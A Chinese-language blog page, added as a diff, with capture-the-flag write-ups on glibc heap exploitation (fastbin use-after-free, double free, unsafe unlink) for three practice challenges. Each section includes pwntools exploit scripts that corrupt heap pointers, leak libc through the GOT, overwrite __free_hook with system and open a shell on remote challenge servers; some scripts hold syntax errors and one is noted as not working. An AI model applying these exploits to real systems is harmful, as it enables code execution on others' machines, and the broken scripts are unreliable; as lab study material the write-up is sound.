@@ -1,0 +1,520 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>double free 与 unlink 利用 | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>double free 与 unlink 利用</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/5
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #ffa2c4">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/heap/" style="color: #03a9f4">
+                    heap
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/double-free/" style="color: #00bcd4">
+                    double-free
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/unlink/" style="color: #00a596">
+                    unlink
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="WUSTCTF-2020-easyfast"><a href="#WUSTCTF-2020-easyfast" class="headerlink" title="[WUSTCTF 2020]easyfast"></a>[WUSTCTF 2020]easyfast</h1><p>main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009249-ba7439b6-7ac9-46cf-be01-f36748023946.png"></p>
+<p>菜单</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009430-a6ecb8d6-8eae-48ba-88ef-01f7c785b17e.png"></p>
+<p>add，我们只能申请四个堆块。要小于0x78</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009208-a4c1c2dd-67c4-48d5-8095-43a4a0c6343b.png"></p>
+<p>Delete。这里free没有检查，有uaf</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009304-65b846da-97ef-4871-ab26-9637835d1395.png"></p>
+<p>Edit，read只能读8个，一个地址的长度</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009329-dcc78ab2-b788-46fd-a74e-43f687f4686e.png"></p>
+<p>Backdoor。后门的条件是这个地址数等于0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010098-34bb718c-2f61-4fb8-b553-08dd94768eb6.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010172-ced52f51-7c99-41e5-9a14-06885a30ccac.png"></p>
+<p>我们要把指针改到602090这个位置去把它的数改成0.再去执行后门</p>
+<p>可以uaf。因为这块限制到了只能四次。先只用uaf</p>
+<p>先定义然后最后调用就行。这道题有后门。</p>
+<pre><code class="language-plain">from pwn import*
+io=remote(&#39;node5.anna.nssctf.cn&#39;,22674)
+#p=process(&#39;./service&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+elf=ELF(&#39;./service&#39;)
+
+addr=0x602090-0x10
+
+def add(size):
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;1&quot;)
+    io.sendlineafter(b&quot;size&gt;\n&quot;,str(size))
+    
+def free(idx):
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;2&quot;)
+    io.sendlineafter(b&quot;index&gt;\n&quot;,str(idx))
+    
+def edit(idx,context):
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;3&quot;)
+    io.sendlineafter(b&quot;index&gt;\n&quot;,str(idx))
+    io.sendline(context)
+    
+def backdoor():
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;4&quot;)
+    
+if __name__==&quot;__main__&quot;
+    add(0x40）
+    free(0)
+    edit(0,p64(addr))
+    add(0x40）
+    add(0x40)
+    edit(2,p64(0))
+    backdoor()
+    io.interactive()
+</code></pre>
+<p>首先用一个堆块构造uaf,然后编辑它到目标地址。再申请chunk1，让它从free list里拿到chunk0。指针到了目标地址。在申请chunk2，指针返回给用户（chunk2 &#x3D; (void*)addr）</p>
+<p>然后我们再edit编辑chunk2，全改成0.因为read这只让读0x8，然后我们就写八字节的0覆盖掉就行</p>
+<p>最后执行后门判断，然后就会执行bin&#x2F;sh</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010366-da40f683-fadc-4603-bd69-4e23ff9ae71a.png"></p>
+<h2 id="有一点套路"><a href="#有一点套路" class="headerlink" title="有一点套路"></a>有一点套路</h2><p>Double free</p>
+<pre><code class="language-plain">add(0x20) # chunk0
+add(0x20) # chunk1
+free(0) # free chunk0
+free(1) # free chunk1
+free(0) # free chunk0
+</code></pre>
+<p>如上执行可以构造循环链表0→1→0, 再执行</p>
+<pre><code class="language-plain">add(0x20) # 分配出 chunk0
+add(0x20) # 分配出 chunk1
+edit(2, target_addr) # edit chunk0 fd指针
+add(0x20) # 分配出 chunk0
+add(0x20) # 申请到 target_addr 处的 chunk
+</code></pre>
+<p>就能劫持chunk到target_addr, 如果提供了edit功能, 就能得到任意地址写的能力</p>
+<p>它申请的时候会多0x10.好像是有个原理。地址计算的时候不能从90开始。要减去0x10，也是这个原理</p>
+<h1 id="SUCTF-2018-招新赛-unlink"><a href="#SUCTF-2018-招新赛-unlink" class="headerlink" title="[SUCTF 2018 招新赛]unlink"></a>[SUCTF 2018 招新赛]unlink</h1><p>菜单</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010239-9d7e2d00-3252-4e27-862c-eff8171c72f2.png"></p>
+<p>add函数，没有什么特别的地方</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010519-df114561-a8d7-48e3-ba34-db167c2da658.png"></p>
+<p>Free free的时候对buf进行了检查。没有uaf。if这有个数组越界？（看着是）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010819-8a1707ff-8866-4e3d-b9ab-ad21cdb1e252.png"></p>
+<p>show函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010918-481ac6f7-d67e-4045-8ea6-a1eba66484c5.png"></p>
+<p>Edit 编辑函数，它读入了0x100可能要堆溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010956-ebd8ca13-bc00-4925-9051-a89ea44b358d.png"></p>
+<p>题目说unlink，就堆溢出unlink来做。没有后门就要unlink来泄露libc</p>
+<p>unlink的常见手法就是构造三个堆块来做假的，然后改双链表的指针。这道题堆在bss段上</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011315-d9632c4e-c0a7-4d43-9ce7-b2948140eb2e.png"></p>
+<p>我们要改0x6020c0这的指针。先申请三个chunk。最后一个是用来防止与top chunk合并的</p>
+<p>要利用bin的话就是满足fast bin和small bin或者unsort bin的大小来申请。</p>
+<p>fast一般要小于0x80 small bin是小于0x200（0x400）32和64好像不一样</p>
+<p>接下来交换指针，fd,bk减去用对应的假堆的偏移。后续交换指针</p>
+<p>再改到要指的位置，用show打印出puts函数got表的地址。泄露libc</p>
+<p>覆盖返回地址的时候用了一个free hook 。<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/ZLF2wqKQUi2OwNkUnWVc3bILnzc">参考一下这个</a></p>
+<pre><code class="language-plain">from pwn import *
+from LibcSearcher import *
+#context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
+ 
+# io=process(&#39;./service2&#39;)
+io=remote(&#39;node4.anna.nssctf.cn&#39;,28326)
+elf=ELF(&#39;./service2&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+def add(size):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;1&#39;)
+    io.sendlineafter(b&#39;size : \n&#39;,str(size).encode())
+ 
+def free(index):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;2&#39;)
+    io.sendlineafter(b&#39;to delete\n&#39;,str(index).encode())
+ 
+def show(index):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;3&#39;)
+    io.sendlineafter(b&#39;to show\n&#39;,str(index).encode())
+    io.recvuntil(b&#39;is : &#39;)
+ 
+def edit(index,payload):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;4&#39;)
+    io.sendlineafter(b&#39;modify :\n&#39;,str(index).encode())
+    io.sendafter(b&#39;content\n&#39;,payload)
+ 
+
+buf=0x6020C0
+add(0x20) 
+add(0x80)  
+add(0x100) 
+
+prev_size=p64(0)
+chunk_size=p64(0x20)
+fd=buf-0x18
+bk=buf-0x10
+content=p64(fd)+p64(bk)
+fake_prev_size=p64(0x20)
+fake_chunk_size=p64(0x90)
+
+payload=prev_size+chunk_size+content+fake_prev_size+fake_chunk_size
+edit(0,payload)
+free(1)
+
+payload=p64(0)*3+p64(0x6020c8)
+edit(0,payload)
+
+payload=p64(elf.got[&#39;puts&#39;])
+edit(0,payload)
+
+show(1)
+puts=u64(io.recvuntil(b&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)
+print(hex(puts))
+
+libc_base=puts-libc.sym[&#39;puts&#39;]
+free_hook=libc_base+libc.sym[&#39;__free_hook&#39;]
+bin_sh=libc_base+next(libc.search(b&#39;/bin/sh\x00&#39;))
+payload=p64(free_hook)+p64(bin_sh)
+edit(0,payload)
+
+system=libc_base+libc.sym[&#39;system&#39;]
+edit(1,p64(system))
+
+free(2)
+ 
+io.interactive()
+</code></pre>
+<p>有字节转换的问题。网上查到了在str后面加.encode这个</p>
+<pre><code class="language-plain">str().encode()
+</code></pre>
+<h1 id="HNCTF-2022-WEEK4-ezheap"><a href="#HNCTF-2022-WEEK4-ezheap" class="headerlink" title="[HNCTF 2022 WEEK4]ezheap"></a>[HNCTF 2022 WEEK4]ezheap</h1><p>这道题没有uaf，题目给了libc。看一下函数</p>
+<p>Menu 这个是用来和用户交互的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011128-d091b74c-3143-4913-9590-b419f464ff97.png"></p>
+<p>Main 判断比较复杂</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011409-6ddd5dd0-f315-4091-af60-59240f027b9e.png"></p>
+<p>Edit 这看上去没啥问题。这个nbytes说的是可以溢出。溢出了不知道有啥用。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011502-597f4446-6189-4f19-8e5a-06901699e7c1.png"></p>
+<p>Delete 对free后的指针做了判断</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011644-7bb0eef8-e6d5-4c7b-95f4-b1def31e1e80.png"></p>
+<p>Show v1满足条件会返回一个地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011756-484fbaf2-48c2-4549-8548-34b00252555b.png"></p>
+<p>Add add这里说这个是puts</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531012077-9e60a91f-82f4-446c-8842-a2ae8e645f67.png"></p>
+<p>是用show和add里的put来劫持地址。没打通</p>
+<pre><code class="language-plain">from pwn import*
+
+io=remote(&#39;node5.anna.nssctf.cn&#39;,23101)
+#io=process(&#39;./ezheap&#39;)
+elf = ELF(&#39;./ezheap&#39;)
+libc = ELF(&#39;./libc-2.23.so&#39;)
+
+def debug():
+    gdb.attach(io)
+    pause()
+
+def choice(idx):
+    io.sendlineafter(&quot;Choice: &quot;,str(idx).encode())
+
+def add(idx,size,name,content):
+    choice(1)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode())
+    io.sendlineafter(&quot;Size:&quot;,str(size).encode())
+    io.sendlineafter(&quot;Name: &quot;,str(name).encode())
+    io.sendlineafter(&quot;Content:&quot;,str(context).encode())
+
+def delete(idx):
+    choice(2)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode)
+    
+def show(idx):
+    choice(3)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode())
+    
+def edit(idx,size,contect):
+    choice(4)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode())
+    io.sendlineafter(&quot;Size:&quot;,str(size).encode())
+    io.sendline(contect)
+
+add(0,0x10,b&#39;good&#39;,b&#39;aaaa&#39;)
+add(1,0x10,b&#39;good&#39;,b&#39;aaaa&#39;)
+
+
+payload=p64(0)*3+p64(0x31)+p64(0)*2+p8(0x80)
+edit(0,0x31,payload)
+show(1)
+#debug()
+
+puts_addr = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&quot;\x00&quot;))
+libc_base = puts_addr - libc.sym[&#39;puts&#39;]
+system = libc_base + libc.sym[&#39;system&#39;]
+
+payload = p64(0)*3+p64(0x31)+b&quot;bin/sh\x00&quot;+p64(0)*2+p64(1)+p64(system)
+edit(0,0x48,payload)
+show(1)
+io.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531012322-4d96f22a-dada-4ac0-a593-764bc8eec6d2.png"></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
